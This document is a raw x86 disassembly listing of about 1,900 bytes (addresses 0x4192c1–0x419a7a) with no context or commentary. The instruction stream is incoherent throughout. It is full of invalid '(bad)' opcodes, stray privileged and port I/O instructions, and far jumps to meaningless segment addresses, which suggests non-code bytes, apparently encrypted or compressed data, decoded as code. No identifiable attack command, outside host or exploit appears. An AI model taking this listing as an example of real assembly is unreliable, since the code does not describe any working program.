  4192c1:	add    BYTE PTR [eax-0x711e8a77],dh
  4192c7:	daa    
  4192c8:	pop    ss
  4192c9:	jl     0x4192b8
  4192cb:	xor    eax,0x12cffa34
  4192d0:	cli    
  4192d1:	mov    cl,0x3e
  4192d3:	mov    esp,0x82f09666
  4192d8:	int    0xf8
  4192da:	jge    0x4192ab
  4192dc:	loope  0x419262
  4192de:	adc    eax,0xed4f051a
  4192e3:	outs   dx,BYTE PTR ds:[esi]
  4192e4:	push   cs
  4192e5:	scas   al,BYTE PTR es:[edi]
  4192e6:	aam    0x7e
  4192e8:	fdiv   QWORD PTR [esi]
  4192ea:	inc    edx
  4192eb:	and    dl,bl
  4192ed:	nop
  4192ee:	add    ebx,DWORD PTR [edx-0x7c484dd6]
  4192f4:	cwde   
  4192f5:	xchg   ecx,eax
  4192f6:	dec    edx
  4192f7:	test   eax,0x6c3be1f3
  4192fc:	jle    0x4192c3
  4192fe:	jo     0x4192f1
  419300:	mov    edi,0x33cec7da
  419305:	or     BYTE PTR [edi+0x6cfc3f76],0xab
  41930c:	loopne 0x41932b
  41930e:	and    esp,DWORD PTR [eax-0x7]
  419311:	mov    BYTE PTR [ebx+0x49],al
  419314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419315:	dec    ebp
  419316:	pushf  
  419317:	or     DWORD PTR [esi-0x5d93e3d2],ebx
  41931d:	pusha  
  41931e:	popf   
  41931f:	mov    al,ds:0xd157cff8
  419324:	xor    eax,DWORD PTR [ecx]
  419326:	loopne 0x4192d5
  419328:	cmc    
  419329:	mov    eax,0x2c6a3035
  41932e:	sub    eax,0xf2c968d1
  419333:	daa    
  419334:	mov    ch,0x82
  419336:	jbe    0x419360
  419338:	aad    0x54
  41933a:	rcl    DWORD PTR [ebx-0x78c6fa85],cl
  419340:	mov    fs,eax
  419342:	daa    
  419343:	add    eax,0xfae79d7c
  419348:	gs and eax,0xfd7728a0
  41934e:	xor    al,0x8a
  419350:	xchg   esi,eax
  419351:	pop    ebx
  419352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419353:	jg     0x4192f1
  419355:	ins    DWORD PTR es:[edi],dx
  419356:	jne    0x419307
  419358:	(bad)  
  419359:	jmp    0xa96c:0xf19fc99f
  419360:	mov    ch,0x64
  419362:	push   cs
  419363:	mul    BYTE PTR [edi-0x5aed4e8d]
  419369:	xchg   esi,eax
  41936a:	adc    eax,0x4f5acaa5
  41936f:	in     eax,dx
  419370:	scas   eax,DWORD PTR es:[edi]
  419371:	mov    ecx,0xc2e96fc1
  419376:	cld    
  419377:	jnp    0x4193b0
  419379:	dec    edi
  41937a:	addr16 hlt 
  41937c:	xchg   esp,eax
  41937d:	dec    edi
  41937e:	and    al,0x39
  419380:	loop   0x419385
  419382:	shr    edx,cl
  419384:	ds aam 0xab
  419387:	rol    DWORD PTR [esi],1
  419389:	mov    ah,0x21
  41938b:	xor    DWORD PTR ds:[ebx-0x14],ebx
  41938f:	js     0x419378
  419391:	sbb    BYTE PTR [ecx+esi*4-0x68],cl
  419395:	test   al,0xb
  419397:	lea    edi,[eax-0x13]
  41939a:	cmp    al,BYTE PTR ds:0xfd742a91
  4193a0:	pop    ss
  4193a1:	inc    ebp
  4193a2:	test   bh,0x21
  4193a5:	jl     0x419336
  4193a7:	(bad)  
  4193a8:	outs   dx,DWORD PTR ds:[esi]
  4193a9:	scas   eax,DWORD PTR es:[edi]
  4193aa:	sbb    eax,0x80005a54
  4193af:	cdq    
  4193b0:	mov    eax,ds:0xf21fca22
  4193b5:	ja     0x41933d
  4193b7:	dec    edx
  4193b8:	shl    BYTE PTR [edi-0xb44055c],cl
  4193be:	mov    ds,WORD PTR [eax-0x47a849b2]
  4193c4:	xor    bh,dl
  4193c6:	scas   al,BYTE PTR es:[edi]
  4193c7:	dec    eax
  4193c8:	leave  
  4193c9:	mov    edx,0x1832a71d
  4193ce:	xchg   edx,eax
  4193cf:	jmp    0x84a:0x2380def1
  4193d6:	int    0x11
  4193d8:	sub    esi,DWORD PTR [ebp-0x246848]
  4193de:	jno    0x419410
  4193e0:	or     esi,DWORD PTR es:[esi]
  4193e3:	mov    ds:0x42e9d8f6,al
  4193e8:	nop
  4193e9:	mov    ds:0xa341286d,al
  4193ee:	rcr    BYTE PTR [ecx+0x2c8d9f61],1
  4193f4:	mov    ds:0x91243d85,al
  4193f9:	jmp    0xc8d1:0x16a9c715
  419400:	push   eax
  419401:	cld    
  419402:	pusha  
  419403:	cmp    dh,al
  419405:	popf   
  419406:	mov    WORD PTR ss:[ecx],cs
  419409:	in     al,0x96
  41940b:	scas   al,BYTE PTR es:[edi]
  41940c:	clc    
  41940d:	sub    DWORD PTR [ebp+ebx*1+0x16517465],ebx
  419414:	push   0xffffffc8
  419416:	call   0x28a8ed7f
  41941b:	ficom  WORD PTR ds:[esi+0x6f48b8f]
  419422:	sbb    BYTE PTR [eax+ebp*4],al
  419425:	add    al,0x69
  419427:	mov    esi,0xcafc22a8
  41942c:	and    al,0x18
  41942e:	add    ah,BYTE PTR [eax]
  419430:	pop    edi
  419431:	push   esi
  419432:	fwait
  419433:	xor    DWORD PTR [ebx+edx*4-0x28],ebx
  419437:	fdivr  QWORD PTR [ebp-0x35]
  41943a:	cmp    al,0x75
  41943c:	jmp    0x1cef:0x41a6b23f
  419443:	xor    dh,cl
  419445:	(bad)  
  419446:	ror    DWORD PTR [eax],cl
  419448:	sbb    DWORD PTR [edi+0x4207b3e4],edi
  41944e:	jl     0x41941f
  419450:	imul   edi,DWORD PTR [esi+esi*2],0x22
  419454:	ins    BYTE PTR es:[edi],dx
  419455:	ret    
  419456:	mov    ecx,0x4ceb413c
  41945b:	loop   0x419431
  41945d:	stos   BYTE PTR es:[edi],al
  41945e:	test   DWORD PTR [ebx],ebp
  419460:	pop    ebp
  419461:	mov    bh,0x49
  419463:	cmp    al,0x47
  419465:	lahf   
  419466:	int3   
  419467:	jno    0x419468
  419469:	mov    ah,0xc4
  41946b:	mov    bl,0x11
  41946d:	jne    0x4194c6
  41946f:	add    ecx,esi
  419471:	push   ss
  419472:	daa    
  419473:	inc    edi
  419474:	mov    dh,0xe4
  419476:	sbb    DWORD PTR [eax+0x4c],0xffffff9b
  41947a:	xchg   ebp,eax
  41947b:	mov    al,ds:0x8f60d509
  419480:	push   eax
  419481:	push   ecx
  419482:	imul   edi,DWORD PTR [esi+0x40],0xcaaffc56
  419489:	repnz ror DWORD PTR [eax+0x33],cl
  41948d:	cmp    eax,0x7b5cbd99
  419492:	add    al,0xf0
  419494:	(bad)  
  419495:	fcom   DWORD PTR [esp+esi*8]
  419498:	jge    0x419508
  41949a:	jns    0x41949b
  41949c:	nop
  41949d:	lods   eax,DWORD PTR ds:[esi]
  41949e:	sub    al,0xa6
  4194a0:	inc    esi
  4194a1:	in     eax,0x62
  4194a3:	fcom   DWORD PTR [edx+0x48892b93]
  4194a9:	pushf  
  4194aa:	mov    dl,BYTE PTR [esi]
  4194ac:	lea    eax,[esi+0x7]
  4194af:	pushf  
  4194b0:	stos   BYTE PTR es:[edi],al
  4194b1:	in     eax,dx
  4194b2:	push   esi
  4194b3:	add    al,0x79
  4194b5:	scas   eax,DWORD PTR es:[edi]
  4194b6:	fs cld 
  4194b8:	shl    DWORD PTR [edi-0x68be6de8],1
  4194be:	xor    eax,0x2913786d
  4194c3:	iret   
  4194c4:	cmc    
  4194c5:	sbb    BYTE PTR [ecx+0x18183831],cl
  4194cb:	mov    ?,WORD PTR [edx]
  4194cd:	ret    0xaca3
  4194d0:	(bad)  
  4194d1:	jb     0x41952a
  4194d3:	int3   
  4194d4:	sar    BYTE PTR [edi-0x68],cl
  4194d7:	push   ecx
  4194d8:	push   esi
  4194d9:	in     al,0x58
  4194db:	jg     0x419528
  4194dd:	mov    fs,esp
  4194df:	adc    esp,esi
  4194e1:	and    eax,0x30ecf3f5
  4194e6:	outs   dx,DWORD PTR ds:[esi]
  4194e7:	(bad)  
  4194e9:	retf   
  4194ea:	test   al,0xeb
  4194ec:	sbb    bl,BYTE PTR [ecx]
  4194ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ef:	push   es
  4194f0:	sbb    ebp,DWORD PTR [eax]
  4194f2:	icebp  
  4194f3:	push   eax
  4194f4:	shr    DWORD PTR [edi+esi*8-0x70],1
  4194f8:	js     0x4194ae
  4194fa:	mov    al,0xbc
  4194fc:	aaa    
  4194fd:	and    al,0x6f
  4194ff:	xchg   esi,eax
  419500:	je     0x4194cb
  419502:	call   0xeedf05f0
  419507:	add    cl,BYTE PTR [ecx+0x1b]
  41950a:	and    dl,BYTE PTR [esi+ecx*1]
  41950d:	std    
  41950e:	arpl   WORD PTR [edx+0x53],si
  419511:	(bad)  
  419512:	fidiv  DWORD PTR [ecx]
  419514:	cmp    al,0x97
  419516:	inc    edx
  419517:	dec    esp
  419518:	dec    edx
  419519:	cli    
  41951a:	shr    BYTE PTR [edx],cl
  41951c:	and    eax,0xf3458e1
  419521:	push   ds
  419522:	or     eax,0x529db922
  419527:	or     ecx,eax
  419529:	pop    edx
  41952a:	add    BYTE PTR [esi],0xe
  41952d:	inc    edi
  41952e:	push   ebx
  41952f:	add    ah,ch
  419531:	push   ss
  419532:	call   0x9935:0x54f5adf6
  419539:	xchg   esi,eax
  41953a:	or     esi,DWORD PTR [esi+0x6fe2f9a7]
  419540:	daa    
  419541:	mov    dh,0xde
  419543:	je     0x4195a6
  419545:	and    al,0x67
  419547:	cli    
  419548:	pop    ebx
  419549:	stos   DWORD PTR es:[edi],eax
  41954a:	and    dh,BYTE PTR [ebx]
  41954c:	cmp    ch,BYTE PTR [ecx+0x51]
  41954f:	pushf  
  419550:	and    al,0x57
  419552:	pushf  
  419553:	xchg   esp,eax
  419554:	cmp    al,0xf3
  419556:	adc    ecx,DWORD PTR [ecx]
  419558:	or     BYTE PTR [esp+edi*2],dl
  41955b:	std    
  41955c:	sbb    dl,ah
  41955e:	scas   al,BYTE PTR es:[edi]
  41955f:	inc    esi
  419560:	jbe    0x419563
  419562:	in     al,0xf3
  419564:	mov    ch,BYTE PTR ds:[ebx+0x25]
  419568:	inc    eax
  419569:	daa    
  41956a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41956b:	xor    edi,DWORD PTR [ebx+0x28]
  41956e:	add    edi,0xffffffd8
  419571:	ror    DWORD PTR [esi*8+0x69397dc3],0x28
  419579:	(bad)  
  41957a:	scas   al,BYTE PTR es:[edi]
  41957b:	arpl   WORD PTR [eax-0x1ed5185c],dx
  419581:	and    DWORD PTR [bx+si+0x4665],0x3
  419587:	lahf   
  419588:	sbb    DWORD PTR [edi],0x1b25642c
  41958e:	and    ebx,DWORD PTR [eax+ebx*4]
  419591:	outs   dx,DWORD PTR ds:[esi]
  419592:	mov    esp,DWORD PTR [edx-0x17]
  419595:	adc    al,0x3a
  419597:	and    DWORD PTR [esi-0x57],ebp
  41959a:	sbb    BYTE PTR [eax],dl
  41959c:	cdq    
  41959d:	(bad)  
  41959e:	es out dx,al
  4195a0:	popf   
  4195a1:	mov    cl,0xf4
  4195a3:	adc    bl,BYTE PTR [edx+0x66]
  4195a6:	pop    ebx
  4195a7:	mov    ch,0xf2
  4195a9:	test   BYTE PTR [edi],0x4
  4195ac:	cmovnp ebx,DWORD PTR [ebp-0x1f]
  4195b0:	in     eax,dx
  4195b1:	adc    eax,0x45def6c
  4195b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195b7:	xor    al,0x33
  4195b9:	test   eax,0x35352aa6
  4195be:	nop
  4195bf:	sub    edx,esi
  4195c1:	sahf   
  4195c2:	xchg   edx,eax
  4195c3:	xor    BYTE PTR ds:0x3681a621,dh
  4195c9:	(bad)  
  4195cb:	dec    eax
  4195cc:	mov    esp,esi
  4195ce:	out    0x29,eax
  4195d0:	jecxz  0x4195b4
  4195d2:	loop   0x4195a1
  4195d4:	sahf   
  4195d5:	inc    ebp
  4195d6:	push   edx
  4195d7:	ins    DWORD PTR es:[edi],dx
  4195d8:	jo     0x41958d
  4195da:	xchg   edx,eax
  4195db:	mov    dh,0x3b
  4195dd:	clc    
  4195de:	xor    eax,0x45809c5c
  4195e3:	mov    al,ds:0x3f1b75f8
  4195e8:	cld    
  4195e9:	fisttp DWORD PTR [ebx+0x60]
  4195ec:	pop    esp
  4195ed:	sahf   
  4195ee:	lods   al,BYTE PTR ds:[esi]
  4195ef:	fwait
  4195f0:	jae    0x419576
  4195f2:	mov    edx,0x6af6b541
  4195f7:	iret   
  4195f8:	neg    DWORD PTR [eax-0x532c598]
  4195fe:	cmp    al,0x9e
  419600:	inc    ah
  419602:	dec    ebp
  419603:	mov    ecx,0x9d41ecef
  419608:	adc    DWORD PTR [eax+eiz*8+0x3fd32e87],ebp
  41960f:	push   ecx
  419610:	mov    esi,0x9beda040
  419615:	jnp    0x4195e1
  419617:	mov    ebp,0xb5cda0a0
  41961c:	(bad)  
  41961d:	pop    ecx
  41961e:	je     0x4195fb
  419620:	popf   
  419621:	mov    al,ds:0x5acec011
  419626:	push   ebp
  419627:	inc    edx
  419628:	sub    BYTE PTR [ebp-0x5350ca4b],0xe4
  41962f:	or     ebx,DWORD PTR [ecx+0x34dba4cc]
  419635:	xor    ebp,edi
  419637:	(bad)  
  419638:	ins    DWORD PTR es:[edi],dx
  419639:	dec    eax
  41963a:	inc    eax
  41963b:	test   BYTE PTR [edi],ah
  41963d:	pop    edx
  41963e:	cmp    ecx,DWORD PTR [edi+0x39b1f008]
  419644:	cwde   
  419645:	add    eax,0xc18d175f
  41964a:	fisttp DWORD PTR [eax-0x56b81966]
  419650:	shr    DWORD PTR [edi-0x13d1451f],0x4f
  419657:	shr    BYTE PTR [edx-0x8018d39],cl
  41965d:	push   es
  41965e:	push   0x49f3783b
  419663:	call   0x1b4:0x91401879
  41966a:	jmp    0x7c6fb615
  41966f:	(bad)  
  419671:	xlat   BYTE PTR ds:[ebx]
  419672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419673:	sar    BYTE PTR [eax-0x7f],cl
  419676:	mov    ch,0x27
  419678:	into   
  419679:	sbb    DWORD PTR [ecx],ebp
  41967b:	cmp    BYTE PTR [edx+0x1620aa7c],cl
  419681:	pushf  
  419682:	inc    esi
  419683:	stos   DWORD PTR es:[edi],eax
  419684:	dec    edi
  419685:	push   esi
  419686:	stos   BYTE PTR es:[edi],al
  419687:	mov    edx,ecx
  419689:	mov    dl,0x2a
  41968b:	das    
  41968c:	jmp    0x41969d
  41968e:	in     eax,0x40
  419690:	retf   
  419691:	xor    ebx,DWORD PTR [ecx+0x44]
  419694:	daa    
  419695:	jmp    0x4e418598
  41969a:	push   ebp
  41969b:	cmp    BYTE PTR [ebx-0x60],dl
  41969e:	std    
  41969f:	shr    DWORD PTR [eax],1
  4196a1:	sti    
  4196a2:	(bad)  
  4196a4:	outs   dx,BYTE PTR ds:[esi]
  4196a5:	dec    ebx
  4196a6:	add    DWORD PTR [edx-0x4c],0xfffffff0
  4196aa:	inc    edi
  4196ab:	lock repnz (bad) 
  4196ae:	popf   
  4196af:	cmp    ebx,esi
  4196b1:	add    edi,ebp
  4196b3:	xchg   edx,eax
  4196b4:	sub    eax,0x3288b191
  4196b9:	sub    DWORD PTR [eax],ecx
  4196bb:	dec    ebx
  4196bc:	inc    ecx
  4196bd:	pop    esp
  4196be:	stos   DWORD PTR es:[edi],eax
  4196bf:	scas   al,BYTE PTR es:[edi]
  4196c0:	(bad)  
  4196c1:	jecxz  0x4196c9
  4196c3:	stc    
  4196c4:	jbe    0x41970e
  4196c6:	popa   
  4196c7:	pushf  
  4196c8:	pop    ecx
  4196c9:	mov    edi,0x2486853b
  4196ce:	iret   
  4196cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196d0:	iret   
  4196d1:	fild   WORD PTR [eax+0x4980acaa]
  4196d7:	je     0x4196ee
  4196d9:	test   al,0xc9
  4196db:	fistp  DWORD PTR [ebx+0x1ef9aa42]
  4196e1:	mov    al,ds:0x4b9382c8
  4196e6:	sub    al,0x51
  4196e8:	test   DWORD PTR [edi],edi
  4196ea:	aad    0xde
  4196ec:	mov    eax,0x58188bd
  4196f1:	push   ds
  4196f2:	sahf   
  4196f3:	dec    esp
  4196f4:	dec    edx
  4196f5:	sub    eax,0x26dfe823
  4196fa:	clc    
  4196fb:	int    0xd5
  4196fd:	inc    ebp
  4196fe:	dec    ax
  419700:	pop    edx
  419701:	(bad)  
  419702:	lods   al,BYTE PTR ds:[esi]
  419703:	pushf  
  419704:	cli    
  419705:	je     0x4196a7
  419707:	dec    edi
  419708:	out    0xe8,al
  41970a:	retf   0xa3a
  41970d:	xchg   edx,eax
  41970e:	rcr    dl,cl
  419710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419711:	mov    bh,0x6e
  419713:	jmp    0x419709
  419715:	dec    edi
  419716:	adc    eax,0xbd45a72d
  41971b:	jnp    0x419788
  41971d:	gs pushf 
  41971f:	lods   al,BYTE PTR ds:[esi]
  419720:	xchg   ebx,eax
  419721:	ret    
  419722:	(bad)  
  419723:	daa    
  419724:	jle    0x419740
  419726:	fs retf 0x9177
  41972a:	mov    ds:0xc859865,al
  41972f:	shl    DWORD PTR [edx+0x20],1
  419732:	adc    dl,BYTE PTR [ecx-0x252e5319]
  419738:	jbe    0x41970d
  41973a:	inc    ebp
  41973b:	rol    DWORD PTR [ebx],cl
  41973d:	retf   0x931f
  419740:	mov    ecx,0xd52b456
  419745:	xchg   esp,eax
  419746:	out    0xf1,eax
  419748:	out    0x73,al
  41974a:	jg     0x41971b
  41974c:	outs   dx,BYTE PTR ds:[esi]
  41974d:	pop    ss
  41974e:	loope  0x4196e5
  419750:	sbb    al,0xfd
  419752:	mov    ds:0x81e15189,eax
  419757:	dec    ebp
  419758:	fst    DWORD PTR [eax+0x4d4fbbf5]
  41975e:	or     BYTE PTR [ebx+0x1a038a9a],bl
  419764:	sbb    BYTE PTR [esp+ebp*1],dl
  419767:	loope  0x419790
  419769:	adc    eax,0xfb004457
  41976e:	out    0xb2,eax
  419770:	popf   
  419771:	add    ecx,DWORD PTR [edi+0x5486ec3]
  419777:	cmp    al,0x51
  419779:	cmp    esp,edi
  41977b:	aaa    
  41977c:	icebp  
  41977d:	stos   DWORD PTR es:[edi],eax
  41977e:	adc    BYTE PTR [eax+0x5c],dl
  419781:	xchg   DWORD PTR [esi+0x7adb4d08],edx
  419787:	out    0xc6,eax
  419789:	pop    edx
  41978a:	add    eax,0xd383f785
  41978f:	dec    esi
  419790:	xor    eax,0x5ede3fe
  419795:	je     0x41973b
  419797:	adc    al,BYTE PTR [ecx]
  419799:	ret    0xf46a
  41979c:	jg     0x419764
  41979e:	add    BYTE PTR [eax-0x72],ch
  4197a1:	and    BYTE PTR [esi+ecx*8+0x7],0x39
  4197a6:	push   edi
  4197a7:	xlat   BYTE PTR ds:[ebx]
  4197a8:	inc    esi
  4197a9:	sub    cl,BYTE PTR [edi-0x43]
  4197ac:	enter  0x4c55,0xbf
  4197b0:	mov    ebp,0x27595e32
  4197b5:	and    bl,BYTE PTR [esi]
  4197b7:	test   eax,0x821f6ca6
  4197bc:	dec    ebp
  4197bd:	or     BYTE PTR [edx+0x4d],dl
  4197c0:	stos   DWORD PTR es:[edi],eax
  4197c1:	or     eax,0xed35ed2c
  4197c6:	call   0xf1e1:0x770091cb
  4197cd:	cmc    
  4197ce:	sti    
  4197cf:	imul   edx,DWORD PTR [ebp-0x30],0x43e36215
  4197d6:	mov    edx,0x63b6bde2
  4197db:	mov    ah,0xc6
  4197dd:	mov    cl,0xe4
  4197df:	pop    ds
  4197e0:	ror    DWORD PTR [ecx],0x30
  4197e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197e4:	cmc    
  4197e5:	sub    dl,BYTE PTR [edi-0x12]
  4197e8:	fcom   DWORD PTR [edx+0x2909e36f]
  4197ee:	lods   eax,DWORD PTR ds:[esi]
  4197ef:	sub    esi,DWORD PTR [edx-0x4d]
  4197f2:	xchg   esi,eax
  4197f3:	inc    ebp
  4197f4:	sbb    bh,0x39
  4197f7:	test   al,0xb1
  4197f9:	int    0x1c
  4197fb:	test   al,0xd2
  4197fd:	dec    ebx
  4197fe:	test   ch,0xb
  419801:	xor    BYTE PTR [eax+eax*2],al
  419804:	push   esi
  419805:	or     ebp,DWORD PTR [edx+0x5f336e4e]
  41980b:	rol    BYTE PTR [eax],cl
  41980d:	inc    ebx
  41980e:	adc    BYTE PTR ds:0x2d96148a,dl
  419814:	jl     0x419824
  419816:	pop    edi
  419817:	retf   
  419818:	mov    ah,0x62
  41981a:	add    DWORD PTR [edi],eax
  41981c:	les    ebx,FWORD PTR [eax+0x56]
  41981f:	fst    DWORD PTR [eax-0x4d]
  419822:	ins    BYTE PTR es:[edi],dx
  419823:	xchg   BYTE PTR [ebx+0x2],dh
  419826:	and    DWORD PTR [eax+0x3e],0x906cd987
  41982d:	test   eax,0x9ad83a26
  419832:	or     DWORD PTR [edi*2-0x66be1163],ecx
  419839:	xlat   BYTE PTR ds:[ebx]
  41983a:	ret    
  41983b:	inc    edi
  41983c:	sar    BYTE PTR [eax+0x0],cl
  41983f:	out    0x62,al
  419841:	imul   edi,DWORD PTR [esi],0x3da6e306
  419847:	lds    eax,FWORD PTR [eax-0x3]
  41984a:	in     eax,0xf1
  41984c:	sbb    ecx,eax
  41984e:	(bad)  
  419850:	mov    eax,ds:0x9d12ba31
  419855:	into   
  419856:	or     BYTE PTR ds:0xcb271073,cl
  41985c:	test   BYTE PTR [ecx+edx*1+0x46],dl
  419860:	imul   ebx,ecx,0xffffffde
  419863:	fisub  WORD PTR [esp+ecx*2]
  419866:	lahf   
  419867:	dec    ebx
  419868:	jns    0x41988b
  41986a:	or     edi,DWORD PTR [eax+ebp*1]
  41986d:	fsubr  QWORD PTR [ecx-0x4206ff18]
  419873:	out    0x7,al
  419875:	in     al,dx
  419876:	add    ch,bl
  419878:	scas   eax,DWORD PTR es:[edi]
  419879:	in     al,dx
  41987a:	cmp    DWORD PTR [ebx+0x5fd4ab79],esi
  419880:	and    eax,ebp
  419882:	div    esi
  419884:	int3   
  419885:	jae    0x4198b6
  419887:	jle    0x4198b4
  419889:	clc    
  41988a:	pop    edx
  41988b:	sub    DWORD PTR [edx-0x6499bab4],0x78dac9a3
  419895:	mov    ds:0xbe64bb41,eax
  41989a:	sub    eax,0xaa332e89
  41989f:	push   esi
  4198a0:	jo     0x419842
  4198a2:	(bad)  
  4198a3:	(bad)  
  4198a4:	jns    0x419915
  4198a6:	retf   0xfd81
  4198a9:	repnz test BYTE PTR [esi+0x23c476c],al
  4198b0:	jnp    0x4198c0
  4198b2:	popf   
  4198b3:	push   es
  4198b4:	aad    0x3
  4198b6:	in     al,0xc0
  4198b8:	test   DWORD PTR [edx+eax*4+0x63f8ecd5],edi
  4198bf:	sbb    BYTE PTR [ecx-0x11c35572],cl
  4198c5:	cs out dx,al
  4198c7:	mov    ecx,DWORD PTR [edi-0x69830048]
  4198cd:	push   ebx
  4198ce:	and    DWORD PTR [ebx],ecx
  4198d0:	jb     0x4198de
  4198d2:	xchg   ecx,eax
  4198d3:	adc    al,ah
  4198d5:	pop    es
  4198d6:	mov    bh,0x5b
  4198d8:	jo     0x419877
  4198da:	pop    esi
  4198db:	and    ebp,DWORD PTR [edi+ecx*4+0x6d858a44]
  4198e2:	mov    ebp,0xfe54aceb
  4198e7:	and    esp,ecx
  4198e9:	rol    BYTE PTR [eax-0x76],1
  4198ec:	aaa    
  4198ed:	pop    ecx
  4198ee:	ss mov eax,0xeda1b873
  4198f4:	into   
  4198f5:	jae    0x41990b
  4198f7:	or     dh,bl
  4198f9:	mov    WORD PTR ds:[ebx+ebx*4-0x51],?
  4198fe:	hlt    
  4198ff:	sbb    al,0x31
  419901:	mov    edx,0xe8d2f3f4
  419906:	int    0x6f
  419908:	aas    
  419909:	xchg   esp,eax
  41990a:	cmp    BYTE PTR fs:[edi-0xa529f79],0xb7
  419912:	mov    ds:0xcbbae212,al
  419917:	stos   DWORD PTR es:[edi],eax
  419918:	pop    esp
  419919:	ror    DWORD PTR [esi+ebp*4],1
  41991c:	jo     0x419974
  41991e:	fld    TBYTE PTR [ecx]
  419920:	psubsw mm4,mm4
  419923:	repz mov ch,dl
  419926:	in     al,0x0
  419928:	repnz mov dh,0xe4
  41992b:	aam    0x8e
  41992d:	add    ebx,DWORD PTR [edx]
  41992f:	test   edx,eax
  419931:	inc    edi
  419932:	lods   eax,DWORD PTR ds:[esi]
  419933:	in     eax,0x64
  419935:	mov    esi,0xd08ca971
  41993a:	int3   
  41993b:	lods   eax,DWORD PTR ds:[esi]
  41993c:	popf   
  41993d:	test   BYTE PTR ds:0xeae64164,dl
  419943:	shl    BYTE PTR [esi-0xb9e850],0x7a
  41994a:	mov    ds:0x33543f35,eax
  41994f:	mov    ebx,0x7fcae4b8
  419954:	sub    ch,bl
  419956:	loop   0x4199a3
  419958:	movaps xmm1,xmm2
  41995b:	pushf  
  41995c:	xchg   ebx,eax
  41995d:	ror    ebx,1
  41995f:	out    0x48,eax
  419961:	adc    BYTE PTR [ebx],cl
  419963:	jo     0x419984
  419965:	dec    esp
  419966:	enter  0xa56b,0xf0
  41996a:	stc    
  41996b:	xchg   ebx,eax
  41996c:	aam    0x80
  41996e:	add    esi,edi
  419970:	inc    edi
  419971:	xchg   ecx,eax
  419972:	int    0xc0
  419974:	stos   BYTE PTR es:[edi],al
  419975:	es pop esi
  419977:	enter  0x4c16,0x6f
  41997b:	mov    ebp,ss
  41997d:	psubq  mm4,mm2
  419980:	out    0xb7,al
  419982:	cwde   
  419983:	inc    ecx
  419984:	xor    BYTE PTR [ebx-0x39e77ed0],dh
  41998a:	pusha  
  41998b:	(bad)  
  41998c:	in     eax,dx
  41998d:	gs push edi
  419990:	in     eax,dx
  419991:	jp     0x41993a
  419993:	cld    
  419994:	add    eax,0xa76b1e32
  419999:	scas   eax,DWORD PTR es:[edi]
  41999a:	jmp    FWORD PTR [eax]
  41999c:	pop    esi
  41999d:	add    al,0xd7
  41999f:	je     0x41999c
  4199a1:	inc    ecx
  4199a2:	jbe    0x4199e4
  4199a4:	mov    edx,esp
  4199a6:	mov    BYTE PTR [ecx],dl
  4199a8:	fnstsw WORD PTR [eax]
  4199aa:	test   al,0x1e
  4199ac:	shl    ah,cl
  4199ae:	scas   eax,DWORD PTR es:[edi]
  4199af:	push   eax
  4199b0:	sub    edx,DWORD PTR [esi+0x47c623e6]
  4199b6:	jns    0x419991
  4199b8:	and    esi,esp
  4199ba:	and    BYTE PTR [edi+0x474485c9],ah
  4199c0:	test   eax,0x92605f87
  4199c5:	dec    eax
  4199c6:	add    DWORD PTR ss:[ebx],eax
  4199c9:	call   0x420d91bc
  4199ce:	pop    ebx
  4199cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199d1:	xchg   eax,ebp
  4199d3:	sub    al,0x14
  4199d5:	cmp    eax,0x9293c498
  4199da:	shr    DWORD PTR [ebx+0x32],cl
  4199dd:	ds jmp 0x419a45
  4199e0:	mov    bh,BYTE PTR [ecx-0x59c788d1]
  4199e6:	push   edx
  4199e7:	shr    ecx,0xee
  4199ea:	lahf   
  4199eb:	xchg   ebp,eax
  4199ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ed:	mov    DWORD PTR [eax-0x31680604],0xf7a831f8
  4199f7:	into   
  4199f8:	shr    DWORD PTR [esi+0x16],1
  4199fb:	dec    edx
  4199fc:	fsubp  st(7),st
  4199fe:	div    BYTE PTR [eax+esi*8]
  419a01:	aam    0x20
  419a03:	xor    DWORD PTR [esi+0x7c],ebx
  419a06:	pop    ebx
  419a07:	dec    edi
  419a08:	xlat   BYTE PTR ds:[ebx]
  419a09:	shl    dh,1
  419a0b:	or     DWORD PTR [eax-0x4f],eax
  419a0e:	push   cs
  419a0f:	push   cs
  419a10:	gs dec edi
  419a12:	lods   eax,DWORD PTR ds:[esi]
  419a13:	sbb    dl,al
  419a15:	jmp    0xd22:0x65f0fc23
  419a1c:	pop    eax
  419a1d:	jns    0x419a3e
  419a1f:	test   eax,0x4aeb8899
  419a24:	nop
  419a25:	adc    al,0x39
  419a27:	jp     0x4199fa
  419a29:	pop    ss
  419a2a:	push   ecx
  419a2b:	(bad)  
  419a2c:	mov    ah,0x25
  419a2e:	test   eax,0x1d467967
  419a33:	aas    
  419a34:	jl     0x419a82
  419a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a37:	sahf   
  419a38:	les    ecx,FWORD PTR [ebp-0x4ea69548]
  419a3e:	mov    gs,esp
  419a40:	push   ecx
  419a41:	jno    0x419a8f
  419a43:	dec    edx
  419a44:	mul    BYTE PTR [ecx-0x7b67e8f8]
  419a4a:	or     DWORD PTR [eax+0x30d7ee98],ebp
  419a50:	dec    ebx
  419a51:	imul   edi,DWORD PTR [edx+0x1],0xffffffe6
  419a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a56:	paddusw mm6,QWORD PTR [eax]
  419a59:	lods   eax,DWORD PTR ds:[esi]
  419a5a:	fimul  WORD PTR [ecx-0x2e]
  419a5d:	iret   
  419a5e:	xchg   esi,eax
  419a5f:	call   0x65e0:0x280b13e5
  419a66:	jne    0x419ad5
  419a68:	push   ss
  419a69:	inc    ebp
  419a6a:	iret   
  419a6b:	call   0x62be61fb
  419a70:	fwait
  419a71:	jae    0x419a79
  419a73:	pusha  
  419a74:	hlt    
  419a75:	inc    eax
  419a76:	jb     0x419a9a
  419a78:	icebp  
  419a79:	hlt    
  419a7a:	outs   dx,BYTE PTR ds:[esi]
